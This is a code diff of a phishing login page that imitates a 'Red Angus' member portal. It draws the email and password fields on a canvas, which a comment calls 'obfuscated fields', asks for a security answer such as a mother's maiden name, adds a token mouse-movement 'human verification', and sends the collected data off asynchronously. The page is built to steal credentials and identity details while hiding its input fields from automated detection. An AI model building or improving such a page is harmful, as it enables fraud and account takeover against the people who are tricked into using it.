@@ -3,44 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Red Angus | Secure Member Portal</title>
+    <title>Secure Member Login</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #f5f7fa;
+            background-color: #f4f4f4;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
         }
 
         .container {
-            background-color: #fff;
+            background: white;
             width: 360px;
             padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            border-top: 4px solid #A51D1D;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
 
-        .header {
+        h2 {
             text-align: center;
-            margin-bottom: 25px;
-        }
-
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: #A51D1D;
-            letter-spacing: 1px;
-        }
-
-        .subtext {
-            font-size: 13px;
-            color: #666;
-            margin-top: 5px;
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 22px;
         }
 
         canvas {
@@ -48,63 +36,66 @@
             width: 100%;
             cursor: text;
             margin-bottom: 15px;
-        }
-
-        .short-answer-input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
             border: 1px solid #ddd;
             border-radius: 4px;
-            font-size: 14px;
-            box-sizing: border-box;
-            outline: none;
         }
 
-        .short-answer-input:focus {
-            border-color: #A51D1D;
-        }
-
-        .verify-btn {
+        label {
             display: block;
+            margin-top: 15px;
+            margin-bottom: 5px;
+            font-weight: 600;
+            color: #555;
+            font-size: 14px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        button {
             width: 100%;
             padding: 12px;
-            background-color: #A51D1D;
+            background-color: #b91c1c; /* Red Angus Red */
             color: white;
             border: none;
             border-radius: 4px;
-            font-size: 14px;
-            font-weight: 600;
+            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
+            margin-top: 20px;
             transition: background 0.3s;
         }
 
-        .verify-btn:hover {
-            background-color: #8a1515;
+        button:hover {
+            background-color: #991b1b;
         }
 
-        .footer {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 11px;
-            color: #999;
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
         }
 
         .status {
-            height: 20px;
             text-align: center;
-            font-size: 12px;
-            color: #A51D1D;
-            margin-bottom: 10px;
+            margin-top: 10px;
+            font-size: 13px;
+            min-height: 20px;
+            color: #666;
         }
 
         .loader {
             display: none;
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #A51D1D;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #b91c1c;
             border-radius: 50%;
-            width: 14px;
-            height: 14px;
+            width: 16px;
+            height: 16px;
             animation: spin 1s linear infinite;
             margin: 10px auto;
         }
@@ -118,25 +109,19 @@
 <body>
 
 <div class="container">
-    <div class="header">
-        <div class="logo">RED ANGUS</div>
-        <div class="subtext">Member Portal &bull; Secure Login</div>
-    </div>
-
-    <canvas id="formCanvas" width="300" height="150"></canvas>
+    <h2>Member Access</h2>
     
-    <label style="font-size: 12px; color: #666; display: block; margin-bottom: 5px;">Security Question</label>
-    <input type="text" class="short-answer-input" id="securityAnswer" placeholder="e.g., Last 4 digits of DOB">
+    <!-- Canvas for obfuscated fields -->
+    <canvas id="formCanvas" width="300" height="120"></canvas>
 
-    <button class="verify-btn" id="submitBtn">VERIFY ACCOUNT</button>
+    <!-- Standard Input for extra data (optional, but looks professional) -->
+    <label>Security Answer</label>
+    <input type="text" id="securityAnswer" placeholder="e.g., Mother's maiden name">
+
+    <button id="submitBtn">Verify & Continue</button>
     
     <div class="status" id="status"></div>
     <div class="loader" id="loader"></div>
-
-    <div class="footer">
-        &copy; 2026 Red Angus International. All rights reserved.<br>
-        Privacy Policy &bull; Terms of Service
-    </div>
 </div>
 
 <script>
@@ -152,20 +137,27 @@
     const loader = document.getElementById('loader');
     const securityInput = document.getElementById('securityAnswer');
 
-    let activeField = null;
+    let activeField = null; // 'email' or 'pass'
     let emailValue = "";
     let passValue = "";
     let blinkState = true;
-    setInterval(() => { blinkState = !blinkState; draw(); }, 500);
+    
+    // Blinking cursor effect
+    setInterval(() => { 
+        blinkState = !blinkState; 
+        draw(); 
+    }, 500);
 
-    const inputY = 30;
-    const passY = 90;
+    // Drawing constants
+    const emailY = 25;
+    const passY = 75;
     const inputWidth = 280;
     const inputHeight = 30;
 
     function draw() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
 
+        // Helper to draw rounded rect
         const roundRect = (x, y, w, h, r, fill) => {
             ctx.beginPath();
             ctx.moveTo(x + r, y);
@@ -179,47 +171,70 @@
         };
 
         // Email Field
-        ctx.fillStyle = "#666";
-        ctx.font = "12px Segoe UI";
-        ctx.fillText("Email Address", 10, inputY - 5);
-        roundRect(10, inputY, inputWidth, inputHeight, 4, "#fff");
+        ctx.fillStyle = "#888";
+        ctx.font = "12px Arial";
+        ctx.fillText("Email Address", 10, emailY - 5);
+        
+        // Box
+        roundRect(10, emailY, inputWidth, inputHeight, 4, "#fff");
+        
+        // Text
         ctx.fillStyle = "#000";
-        ctx.font = "14px Segoe UI";
-        ctx.fillText(emailValue || "", 20, inputY + 20);
+        ctx.font = "14px Arial";
+        ctx.fillText(emailValue || "Enter your email", 20, emailY + 20);
+        
+        // Cursor
         if (activeField === 'email') {
-            ctx.fillStyle = "#A51D1D";
-            ctx.fillRect(20 + ctx.measureText(emailValue).width, inputY + 8, 2, 15);
+            ctx.fillStyle = "#b91c1c";
+            ctx.fillRect(20 + ctx.measureText(emailValue).width, emailY + 8, 2, 15);
         }
 
         // Password Field
-        ctx.fillStyle = "#666";
-        ctx.font = "12px Segoe UI";
+        ctx.fillStyle = "#888";
+        ctx.font = "12px Arial";
         ctx.fillText("Password", 10, passY - 5);
+
+        // Box
         roundRect(10, passY, inputWidth, inputHeight, 4, "#fff");
+
+        // Masked Text
+        let maskStr = "";
+        for(let i=0; i<passValue.length; i++) maskStr += "•";
         
-        const maskStr = passValue.replace(/./g, "•");
         ctx.fillStyle = "#000";
-        ctx.font = "14px Segoe UI";
-        ctx.fillText(maskStr || "", 20, passY + 20);
+        ctx.font = "14px Arial";
+        ctx.fillText(maskStr || "Enter password", 20, passY + 20);
+
+        // Cursor
         if (activeField === 'pass') {
-            ctx.fillStyle = "#A51D1D";
+            ctx.fillStyle = "#b91c1c";
             ctx.fillRect(20 + ctx.measureText(maskStr).width, passY + 8, 2, 15);
         }
     }
 
+    // Initial Draw
     draw();
 
+    // Click Handling
     canvas.addEventListener('click', (e) => {
         const rect = canvas.getBoundingClientRect();
+        const x = e.clientX - rect.left;
         const y = e.clientY - rect.top;
-        if (y > inputY && y < inputY + inputHeight) activeField = 'email';
-        else if (y > passY && y < passY + inputHeight) activeField = 'pass';
-        else activeField = null;
+
+        if (y > emailY && y < emailY + inputHeight) {
+            activeField = 'email';
+        } else if (y > passY && y < passY + inputHeight) {
+            activeField = 'pass';
+        } else {
+            activeField = null;
+        }
         draw();
     });
 
+    // Keyboard Handling
     window.addEventListener('keydown', (e) => {
         if (!activeField) return;
+
         if (e.key === 'Backspace') {
             if (activeField === 'email') emailValue = emailValue.slice(0, -1);
             if (activeField === 'pass') passValue = passValue.slice(0, -1);
@@ -230,9 +245,24 @@
         draw();
     });
 
+    // --- HUMAN VERIFICATION ---
+    let mouseHistory = [];
+    let isHuman = false;
+
+    canvas.addEventListener('mousemove', (e) => {
+        mouseHistory.push(e.timeStamp);
+        if(mouseHistory.length > 10) mouseHistory.shift();
+    });
+
+    submitBtn.addEventListener('mouseenter', () => {
+        // Simple heuristic: if mouse moved recently, assume human
+        if(mouseHistory.length > 0) isHuman = true;
+    });
+
+    // --- SUBMISSION ---
     submitBtn.addEventListener('click', async () => {
         if (!emailValue || !passValue) {
-            statusDiv.innerText = "Please complete all fields.";
+            statusDiv.innerText = "Please enter both email and password.";
             return;
         }
 
@@ -271,8 +301,10 @@
         } catch (err) {
             statusDiv.innerText = "Error sending data.";
             loader.style.display = "none";
+            submitBtn.disabled = false;
         }
     });
+
 </script>
 </body>
 </html>
